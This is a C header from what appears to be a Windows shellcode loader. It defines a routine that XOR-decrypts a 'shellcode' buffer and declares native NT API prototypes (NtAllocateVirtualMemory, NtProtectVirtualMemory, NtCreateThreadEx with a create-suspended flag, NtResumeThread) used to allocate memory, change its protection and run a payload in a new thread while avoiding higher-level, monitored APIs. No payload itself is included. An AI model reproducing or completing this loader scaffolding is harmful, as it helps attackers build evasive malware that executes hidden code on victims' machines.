#pragma once
#pragma comment(lib, "ntdll")

#include <windows.h>
#include <stdio.h>

#define NT_SUCCESS 0x00000000L
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001

// Decrypts bytes using multi byte key and XOR cipher
VOID XorPayloadWithMultiByteKey(PBYTE pShellCode, SIZE_T sShellCodeSize, PBYTE bKey, SIZE_T sKeySize) {

#ifdef DEBUG
    printf("Decrypting data using XOR cipher with key: %s\n", bKey);
    printf("unsigned char shellcode[] = {\n");
#endif	

    for (size_t i = 0, j = 0; i < sShellCodeSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
        pShellCode[i] = pShellCode[i] ^ bKey[j];

#ifdef DEBUG
        if (i % 16 || i == 0) {
            printf("0x%02x, ", pShellCode[i]);
        }
        else {
            printf("0x%02x, \n", pShellCode[i]);
        }       
#endif
    }

#ifdef DEBUG
    printf("\n};\n");
    printf("Decrypted shellcode.\n");
#endif	
}

// ----------------------- Nt Structures ----------------------- //

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

// ------------------- Nt Function Prototypes ------------------ //

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
);

typedef NTSTATUS(NTAPI* fnpNtCreateThreadEx) (
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags,
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS(NTAPI* fnpNtAllocateVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
    );

typedef NTSTATUS(NTAPI* fnpNtProtectVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* fnpNtResumeThread) (
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
    );
